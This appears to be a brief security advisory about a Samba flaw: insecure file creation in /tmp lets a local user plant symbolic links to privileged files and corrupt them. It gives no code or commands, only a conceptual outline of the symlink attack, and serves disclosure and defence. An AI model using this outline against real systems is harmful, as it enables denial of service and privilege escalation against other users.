Samba is a flexible file sharing packaged maintained by the Samba development group. It provides interoperatability between UNIX and Microsoft Windows systems, permitting the sharing of files and printing services.

A problem in the package could make it possible to deny service to legitimate users. Due to the insecure creation of files in the /tmp file system, it is possible for a user to create a symbolic link to other files owned by privileged users in the system, such as system device files, and write data to the files.

This vulnerability makes it possible for a local user to deny service to other users of the system, and potentially gain elevated privileges.
